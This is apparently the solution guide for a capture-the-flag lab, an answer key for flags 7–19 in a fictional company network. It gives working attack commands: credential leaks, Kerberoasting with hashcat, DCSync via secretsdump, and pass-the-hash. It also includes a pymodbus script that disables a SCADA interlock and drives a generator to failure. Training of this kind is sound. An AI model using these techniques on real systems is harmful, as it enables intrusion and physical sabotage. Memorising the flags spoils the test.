# Flags 7–19: Front Office

> **Start here:** Read [00-range-access.md](00-range-access.md) first for SSH instructions, how to start services, ports, and credentials.

These flags come from the intranet (A3), mail server (A1), file share (A4), domain controller (A2), and SCADA system (A5). A1 and A4 are content-on-disk in the test environment — read files directly from `/tmp/a1-content/` and `/tmp/a4-content/`.

---

## Flag 7 — Creds in Web App Config (Easy, 50pts)

1. Try fetching `/.env` from the intranet: `curl http://intranet.boreas.local/.env`
2. Alternatively try `/config.bak`.
3. The file is a plaintext config with database credentials, the admin password, and a line:
   ```
   API_KEY=FLAG{4f2e8b7a1c6d9035}
   ```

**Expected flag:** `FLAG{4f2e8b7a1c6d9035}`

---

## Flag 8 — Employee Email with Project Hints (Easy, 50pts)

1. Log into the webmail (Roundcube) at `http://mail.boreas.local` as one of the employees. Try `d.kowalski` / `P@ssw0rd123` (found from the config leak on A3 or from A0's employee directory + password guessing).
2. Look through Dr. Vasik's mailbox (you may need her credentials: `e.vasik` / `Reactor#Core9`).
3. Find the email with subject "Re: Locomotion milestone?" that has a PDF attachment: `project_status_report_oct2025.pdf`.
4. Open the PDF. At the bottom it has a Report ID containing the flag.

**Expected flag:** `FLAG{3b7e9a2d1c8f4063}`

---

## Flag 9 — HR Records / Terminated Engineer (Easy, 50pts)

1. Connect to the file share: `smbclient //fileserv.boreas.local/HR -U <username>%<password>`
   Use any employee credentials. HR share is accessible to HR group + Executives.
2. Navigate to `personnel/`.
3. Download `chen_james_termination.pdf`.
4. The flag is on **page 2** of the PDF, in the "Case Reference Number" field.

**Expected flag:** `FLAG{7a1b3d9e2c8f0546}`

---

## Flag 10 — Password Reuse Gives Mail Access (Easy, 50pts)

1. Log into the webmail as `d.kowalski` with password `P@ssw0rd123`.
   - This password is discoverable from the A0 employee directory (Kowalski is listed) + common password guessing, or from the `.env` config on A3.
2. In Kowalski's inbox, find the first email: "Welcome to your Boreas Systems mailbox" from `postmaster@boreas.local`.
3. The email contains an "Account activation token" which is the flag.

**Expected flag:** `FLAG{e5d1f8c2a7b03946}`

---

## Flag 11 — Cafeteria Menu / Mundane File Share (Easy, 50pts)

1. Connect to the Public share: `smbclient //fileserv.boreas.local/Public -U <username>%<password>`
2. Download `cafeteria_menu_april.pdf`.
3. Check the PDF metadata: `exiftool cafeteria_menu_april.pdf` or `pdfinfo cafeteria_menu_april.pdf`.
4. The **Author** field contains the flag.

**Expected flag:** `FLAG{0e6f9c2d4a8b7135}`

---

## Flag 12 — Internal Wiki / "The Project" (Easy, 50pts)

1. Log into the intranet at `http://intranet.boreas.local/login`. Use any valid credentials (e.g., `d.kowalski` / `P@ssw0rd123`).
2. Browse the wiki. Go to **"Project Coordination"** page.
3. **View the page source.** The flag is in an HTML comment at the top of the content:
   ```html
   <!-- FLAG{d8a3c5e9f1b07264} -->
   ```

**Expected flag:** `FLAG{d8a3c5e9f1b07264}`

---

## Flag 13 — Procurement Orders / Hydraulic Actuators (Medium, 100pts)

1. Connect to the Procurement share: `smbclient //fileserv.boreas.local/Procurement -U <username>%<password>`
2. Download `PO-2847_hydraulic_actuators.pdf`.
3. Read the PO. In the **Special Instructions** field, it references: `specs/actuator_requirements_v4.pdf`.
4. Navigate to the `specs/` subdirectory and download `actuator_requirements_v4.pdf`.
5. The flag is in the document as a "Specification ID."

**Expected flag:** `FLAG{8c5a0d3f7e1b2964}`

---

## Flag 14 — AD Enumeration / Suspicious Accounts (Medium, 100pts)

1. Use LDAP to enumerate the domain:
   ```
   ldapsearch -x -H ldap://dc01.boreas.local -b "DC=boreas,DC=local" -D "d.kowalski@boreas.local" -w "P@ssw0rd123" "(objectClass=group)" cn member
   ```
2. You'll see groups like Lab-Access, SCADA-Admins, Security-Staff. But "Project-L" is **not directly visible** — it's nested.
3. Look at `Engineering-Support` → its member is `Research-Coordination` → its member is `Project-L`.
4. Query the `Project-L` group specifically, requesting the `info` attribute:
   ```
   ldapsearch ... "(cn=Project-L)" info member
   ```
5. The `info` attribute contains the flag.

**Expected flag:** `FLAG{2f8b4a6c1d9e7053}`

---

## Flag 15 — Lateral Movement to Second Host (Medium, 100pts)

1. Log into the webmail as `d.kowalski` / `P@ssw0rd123`.
2. Find the email with subject **"creds backup"** (Kowalski sent it to himself).
3. It contains credentials for the file share service account:
   ```
   Server: fileserv.boreas.local
   User: svc-fileshare
   Pass: F1l3Sh@r3Svc!
   Shares: \\fileserv\IT
   ```
4. Connect to the IT share using these service account credentials:
   ```
   smbclient //fileserv.boreas.local/IT -U "svc-fileshare%F1l3Sh@r3Svc!"
   ```
5. Download `backup_verification.log`.
6. The flag is in the log file as a "Backup verification token."

**Expected flag:** `FLAG{9a4c7e2f58d0b163}`

---

## Flag 16 — Guard Rotation Logs / Unreliable Guard (Medium, 100pts)

1. Access the badge log share on the DC:
   ```
   smbclient //dc01.boreas.local/badgelogs -U "svc-backup%Password1"
   ```
2. Download `access_log_march_2026.csv`.
3. Cross-reference Petrov's entries with the guard rotation schedule (from Morrison's email on A1).
4. Petrov accessed the **Underground Hatch** 6 times between 02:00-03:00 AM — outside his scheduled patrol.
5. One of Petrov's log entries has the flag in the status/comment field.

**Expected flag:** `FLAG{b3d7e1f0c8a24596}`

---

## Flag 17 — Privilege Escalation / Domain Admin (Hard, 200pts)

1. Enumerate SPNs in the domain using Impacket:
   ```
   GetUserSPNs.py "BOREAS.LOCAL/d.kowalski:P@ssw0rd123" -dc-ip dc01.boreas.local -request
   ```
2. You get a Kerberos TGS hash for `svc-backup` (and `svc-scada`).
3. Crack the `svc-backup` hash with hashcat or john:
   ```
   hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
   ```
   Password is `Password1` — cracks in seconds.
4. `svc-backup` has misconfigured **DCSync rights** (Replicating Directory Changes). Use secretsdump:
   ```
   secretsdump.py "BOREAS.LOCAL/svc-backup:Password1@dc01.boreas.local" -just-dc-user Administrator
   ```
5. You get the Administrator NTLM hash. Use it to access the DA-only share:
   ```
   smbclient //dc01.boreas.local/admin_flag -U "BOREAS\Administrator%CTFAdmin2026!"
   get flag.txt
   ```
   (Or use pass-the-hash with the extracted NTLM hash.)
6. The flag is in `flag.txt`.

**Expected flag:** `FLAG{6c0a9d4e7f2b8135}`

---

## Flag 18 — SCADA Interface Discovered (Hard, 200pts)

1. The SCADA HMI is on VLAN 40, not directly reachable. Discover it from:
   - The IT share network diagram (VLAN 40: `scada-gw.boreas.local`)
   - Kowalski's email about isolating the SCADA on VLAN 40
   - The intranet IT Knowledge Base page
2. Pivot through a compromised Front Office host to reach VLAN 40.
3. Access the HMI monitoring dashboard at `http://scada-gw.boreas.local:8080` — no auth required for monitoring.
4. The flag is in the **page footer** as "S/N: FLAG{...}".

**Expected flag:** `FLAG{1d4e7b0a3c9f8265}`

---

## Flag 19 — Generator SCADA Override / Collective Gate (Expert, 300pts)

1. Access the SCADA HMI architecture page at `/architecture`. It reveals:
   - A Modbus PLC on port 502 controls the hardware interlock
   - The interlock must be bypassed via raw Modbus before the HMI controls work
2. Authenticate to the HMI control panel with `svc-scada` credentials (from Kerberoasting A2, or from the A4 IT share).
3. Use a Modbus client to bypass the interlock:
   ```python
   from pymodbus.client import ModbusTcpClient
   c = ModbusTcpClient("scada-gw.boreas.local", port=502)
   c.connect()
   c.write_register(address=200, value=7734)  # maintenance key
   c.write_register(address=100, value=0)      # disable interlock
   ```
   The maintenance key `7734` is documented in a maintenance manual on the A4 IT share.
4. With interlock bypassed, set fuel injection to 100% and cooling to 0%:
   ```python
   c.write_register(address=10, value=100)  # fuel 100%
   c.write_register(address=11, value=0)    # cooling 0%
   ```
5. Wait ~12 seconds. The HMI shows temperature climbing to CRITICAL.
6. The flag appears on the "CRITICAL FAILURE" screen on the web dashboard.
7. **This is the collective gate** — it opens the Bunker for all participants.

**Expected flag:** `FLAG{a7f2c8d0e5b34169}`
